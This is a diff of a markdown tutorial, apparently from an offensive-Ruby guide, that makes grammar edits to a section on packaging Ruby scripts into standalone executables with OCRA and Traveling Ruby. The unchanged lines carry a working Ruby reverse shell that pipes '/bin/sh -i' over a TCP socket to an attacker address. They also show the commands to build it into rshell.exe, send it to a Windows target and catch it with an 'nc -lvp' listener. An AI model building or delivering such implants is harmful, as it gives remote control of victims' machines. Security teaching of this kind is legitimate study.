@@ -2,11 +2,11 @@
 
 ## Packaging
 
-Many questions about building a standalone application that doesn't require Ruby to be pre-installed on the system. Of-course, due attacking machine you cant grantee that ruby is installed on the target system. So here we will demonstrate some ways to do that.
+Many may question now, how to build a standalone application that doesn't require Ruby being installed on the target system. Of course, due to your target most likely having an unknown software set you can't guarantee that Ruby is installed. So here, we will demonstrate some ways to do that.
 
 
 ### One-Click Ruby Application(OCRA) Builder
-OCRA (One-Click Ruby Application) builds Windows executables from Ruby source code. The executable is a self-extracting, self-running executable that contains the Ruby interpreter, your source code and any additionally needed ruby libraries or DLL.
+OCRA (One-Click Ruby Application) builds Windows executables from Ruby source code. The executable is a self-extracting, self-running executable that contains the Ruby interpreter, your source code and any additional Ruby libraries or DLLs needed.
 
 **It's Windows support only**, not really ;)
 
@@ -21,7 +21,7 @@ OCRA (One-Click Ruby Application) builds Windows executables from Ruby source co
 gem install ocra
 ```
 
-So all what to need is to have your application.
+So, now all you need to do is use this tool on your application.
 
 Suppose we have the following script, a reverse shell of course ;)
 ```ruby
@@ -39,7 +39,7 @@ while cmd = s.gets
 end
 ```
 
-from our Windows Attacker machine cmd.exe
+from our attacking computer's command prompt in Windows (cmd.exe)
 ```
 C:\Users\admin\Desktop>ocra rshell.rb --windows --console
 ```
@@ -83,7 +83,7 @@ In the same directory, you'll find an exe file `rshell.exe`. Send it on the wind
 rshell.exe 192.168.0.14 9911 
 ```
 
-from our attacking machine we already listening on 9911
+from our attacking machine we are already listening on port 9911
 ```
 nc -lvp 9911
 ```
@@ -95,14 +95,14 @@ nc -lvp 9911
 From official site[^1] "*Traveling Ruby is a project which supplies self-contained, "portable" Ruby binaries: Ruby binaries that can run on any Linux distribution and any OS X machine. It also has Windows support (with some caveats). This allows Ruby app developers to bundle these binaries with their Ruby app, so that they can distribute a single package to end users, without needing end users to first install Ruby or gems.*"
 
 
-Note: The following script has been taken from the official docs.
+Note: The following script has been taken from the 'Traveling-ruby' official documentation.
 
 #### Preparation 
 ```
 mkdir rshell
 cd rshell
 ```
-- Create your application -in our case, reverse shell- in "rshell" folder
+- Create your application (in our case, reverse shell) in "rshell" folder
 
 **rshell.rb**
 ```ruby
@@ -118,7 +118,8 @@ s = TCPSocket.open(ip,port).to_i
 exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
 
-- Test it 
+- Test it
+- Profit
 
 ```
 ruby rshell.rb 
